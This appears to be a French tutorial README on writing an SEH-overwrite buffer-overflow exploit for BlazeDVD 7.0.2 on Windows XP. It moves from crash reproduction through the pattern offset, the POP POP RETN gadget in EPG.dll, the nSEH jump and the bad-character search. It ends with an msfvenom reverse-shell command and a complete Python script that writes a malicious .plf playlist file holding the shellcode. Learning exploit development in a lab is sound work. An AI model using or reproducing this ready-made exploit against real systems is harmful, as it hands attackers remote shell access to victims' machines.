# Windows dev exploit SEH - BlazeDVD 7.0.2

Prérequis :

* [BlazeDBD 7.0.2](https://d1idh0lj1bwsni.cloudfront.net/4tr7_e8c6ca3p/blazedvd_professional.exe)
* [Windows XP SP3 x86](https://www.mes-vms.fr/machine-virtuelle-windows-xp-professionnel-sp3-32bits-en-francais/)
* [Immunity Debugger](https://www.immunityinc.com/products/debugger/)
* [Mona](https://github.com/corelan/mona)

1. Fuzzing
2. Identifier l'exception
3. Créer un pattern
4. Localiser le SEH
5. Trouver un POP POP RETN
6. Remplacer le nSEH
7. Identifier les badchars
8. Générer l'exploit

## Etape 1 : Fuzzing

A faire

## Etape 2 : Identifier l'exception

```PYTHON
filename="crash.plf"
buffer ="A"*630
textfile=open(filename, 'w')
textfile.write(buffer)
textfile.close()

```
Lancer immunity debugger en tant qu'administrateur. Lancer BlazeDVD.
Dans immunity debugger attacher le processus ( File -> Attach )

Dans BlazeDVD ouvrir une nouvelle playlist et choisir le fichier crash.plf

L'EIP est bien écrasé mais ECX ne contient pas encore les 41 ("A")

![](images/first_crash.png)

On jump après la première exeception dans immunity debugger avec Shift + F9

![](images/second_crash.png)

L'EIP est bien écrasé et ECX contient les 41 ("A")

## Etape 3 : Créer un pattern 

On créer un pattern

```BASH
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 630
```

## Etape 4 : Localiser le SEH

On trouve la position du SEH dans immunity debugger avec mona : 

```
!mona findmsp
```
![](images/findmsp.png)

On a junk + nSEH + SEH + junk : "A" * 608 + nSEH + SEH + "D" * (630 - 608 - 4 - 4)

## Etape 5 : Trouver un POP POP RETN

On cherche ensuite un SEH avec POP POP RETN : 
```
!mona seh 
```

Allez voir dans le fichier [seh.txt](files/seh.txt) dans le dossier de Immunity Debugger.

On cherche une ligne avec que des "False" et une adresse qui ne contiennent pas de badchars

```
0x6164172e : pop ecx # pop ecx # ret 0x08 | asciiprint,ascii {PAGE_EXECUTE_READ} [EPG.dll] ASLR: False, Rebase: False, SafeSEH: False, OS: False, v1.12.21.2006 (C:\Program Files\BlazeVideo\BlazeDVD7 Professional\EPG.dll)
```
On réexécute le programme en modifiant l'adresse du SEH

```PYTHON
#!/usr/bin/python

filename="seh.plf"
#seh pop pop ret vient de la dll EPG.dll
seh="\x2e\x17\x64\x61"
buffer = "A"*608+"B"*4+seh+"A"*(630-608+4+4)

textfile = open(filename,'w')
textfile.write(buffer)
textfile.close()
```


## Etape 6 : Remplacer le nSEH


Normalement dans immunity debugger l'instruction est précédée de 4 x 42

![](images/jmp_nseh.png)

Clique droit dessus => Assemble , on entre alors une adresse où les 41 (A) (après notre instruction) sont présents
 : jmp 0012F4D4

![](images/replace_jmp_nseh.png)

On voit que les deux premières instructions sont remplacées par EB 06

Mais pas les deux suivantes (42 42) donc notre SEH vaudra : eb 06 90 90


On a alors : junk + nSEH + SEH + junk : 
```
"A" * 608 + "\xeb\x06\x90\x90" + "\x2e\x17\x64\x61" + "D" * (630 - 608 - 4 - 4)
```

Ce qui nous donne :

```PYTHON
#!/usr/bin/python

filename="nseh.plf"
#seh pop pop ret vient de la dll EPG.dll
seh="\x2e\x17\x64\x61"
nseh="\xeb\x06\x90\x90"
buffer = "A"*608+nseh+seh+"C"*(630-608+4+4)

textfile = open(filename,'w')
textfile.write(buffer)
textfile.close()

```


## Etape 7 : Identifier les badchars 

Il est nécessaire de générer toutes les combinaisons possibles avant de générer notre shellcode.

```PYTHON
import sys
for x in range(1,256):
	sys.stdout.write("\\x" + '{:02x}'.format(x))

```

On va voir les caractères qui ne passent pas correctement en mémoire.

```PYTHON
#!/usr/bin/python

filename="bad_chars.plf"
#seh pop pop ret vient de la dll EPG.dll
seh="\x2e\x17\x64\x61"
nseh="\xeb\x06\x90\x90"

#identified bad chars 0a 1a

bad="\x01\x02\x03\x04\x05\x06\x07\x08\x09\x01\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x01\x1b\x1c\x1d\x1e\x1f\x20\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff"

buffer = "A"*608+nseh+seh+bad

print len(buffer)

textfile = open(filename,'w')
textfile.write(buffer)
textfile.close()

```

![](images/bad_chars.png)

Par exemple sur cette capture on peut constater que les caractères après le "0a" ne sont plus correctement interprétés. Nous allons remplacer le "0a" du script précédent par "01". 

Il faut ensuite regénérer un nouveau fichier de badchar pour pouvoir identifier le caractère suivant qui peut bloquer.
Une fois tous les caractères bloquants identifiés vous pouvez passer à la suite.

Les badchars sont \x00\x0a\x1a


## Etape 8 : Générer l'exploit

Ce qui nous donne

```
"A" * 608 + "\xeb\x06\x90\x90" + "\x2e\x17\x64\x61"
```

Enfin on génère notre Shellcode en enlevant les badchars :
```
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.105 LPORT=443 -b "\x00\x0a\x1a" -f python EXITFUNC=thread -a x86
```

Notre exploit final :

```
"A" * 608 + "\xeb\x06\x90\x90" + "\x2e\x17\x64\x61" + shellcode 
```

![](images/reverse_shell_ok.png)


```PYTHON
#!/usr/bin/python

filename="exploit.plf"
#seh pop pop ret vient de la dll EPG.dll
seh="\x2e\x17\x64\x61"
nseh="\xeb\x06\x90\x90"

#msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.105 LPORT=443 -b "\x00\x0a\x1a" -f python EXITFUNC=thread -a x86

shellcode =  ""
shellcode += "\xba\xb3\x28\xc0\x99\xda\xcb\xd9\x74\x24\xf4\x5e\x33"
shellcode += "\xc9\xb1\x52\x31\x56\x12\x03\x56\x12\x83\x75\x2c\x22"
shellcode += "\x6c\x85\xc5\x20\x8f\x75\x16\x45\x19\x90\x27\x45\x7d"
shellcode += "\xd1\x18\x75\xf5\xb7\x94\xfe\x5b\x23\x2e\x72\x74\x44"
shellcode += "\x87\x39\xa2\x6b\x18\x11\x96\xea\x9a\x68\xcb\xcc\xa3"
shellcode += "\xa2\x1e\x0d\xe3\xdf\xd3\x5f\xbc\x94\x46\x4f\xc9\xe1"
shellcode += "\x5a\xe4\x81\xe4\xda\x19\x51\x06\xca\x8c\xe9\x51\xcc"
shellcode += "\x2f\x3d\xea\x45\x37\x22\xd7\x1c\xcc\x90\xa3\x9e\x04"
shellcode += "\xe9\x4c\x0c\x69\xc5\xbe\x4c\xae\xe2\x20\x3b\xc6\x10"
shellcode += "\xdc\x3c\x1d\x6a\x3a\xc8\x85\xcc\xc9\x6a\x61\xec\x1e"
shellcode += "\xec\xe2\xe2\xeb\x7a\xac\xe6\xea\xaf\xc7\x13\x66\x4e"
shellcode += "\x07\x92\x3c\x75\x83\xfe\xe7\x14\x92\x5a\x49\x28\xc4"
shellcode += "\x04\x36\x8c\x8f\xa9\x23\xbd\xd2\xa5\x80\x8c\xec\x35"
shellcode += "\x8f\x87\x9f\x07\x10\x3c\x37\x24\xd9\x9a\xc0\x4b\xf0"
shellcode += "\x5b\x5e\xb2\xfb\x9b\x77\x71\xaf\xcb\xef\x50\xd0\x87"
shellcode += "\xef\x5d\x05\x07\xbf\xf1\xf6\xe8\x6f\xb2\xa6\x80\x65"
shellcode += "\x3d\x98\xb1\x86\x97\xb1\x58\x7d\x70\x7e\x34\x7c\xe9"
shellcode += "\x16\x47\x7e\xe8\x5d\xce\x98\x80\xb1\x87\x33\x3d\x2b"
shellcode += "\x82\xcf\xdc\xb4\x18\xaa\xdf\x3f\xaf\x4b\x91\xb7\xda"
shellcode += "\x5f\x46\x38\x91\x3d\xc1\x47\x0f\x29\x8d\xda\xd4\xa9"
shellcode += "\xd8\xc6\x42\xfe\x8d\x39\x9b\x6a\x20\x63\x35\x88\xb9"
shellcode += "\xf5\x7e\x08\x66\xc6\x81\x91\xeb\x72\xa6\x81\x35\x7a"
shellcode += "\xe2\xf5\xe9\x2d\xbc\xa3\x4f\x84\x0e\x1d\x06\x7b\xd9"
shellcode += "\xc9\xdf\xb7\xda\x8f\xdf\x9d\xac\x6f\x51\x48\xe9\x90"
shellcode += "\x5e\x1c\xfd\xe9\x82\xbc\x02\x20\x07\xdc\xe0\xe0\x72"
shellcode += "\x75\xbd\x61\x3f\x18\x3e\x5c\x7c\x25\xbd\x54\xfd\xd2"
shellcode += "\xdd\x1d\xf8\x9f\x59\xce\x70\x8f\x0f\xf0\x27\xb0\x05"

buffer = "A"*608+nseh+seh+shellcode

textfile = open(filename,'w')
textfile.write(buffer)
textfile.close()

```

Source : https://www.exploit-db.com/exploits/48329